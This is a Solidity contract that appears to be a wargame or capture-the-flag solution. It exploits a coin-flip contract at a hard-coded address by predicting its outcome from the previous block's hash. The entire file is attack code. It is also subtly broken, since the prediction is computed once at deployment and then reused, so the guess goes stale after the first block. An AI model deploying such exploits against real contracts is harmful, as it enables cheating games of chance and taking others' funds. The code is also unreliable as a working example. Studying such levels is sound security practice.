// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

interface CoinFlip2 {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {
    using SafeMath for uint256;
    CoinFlip2 public originalContract = CoinFlip2(0x7E2310434935c02a5fF64029A5CD004668B76e0d);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    function flip() public {
        originalContract.flip(side);
    }


}
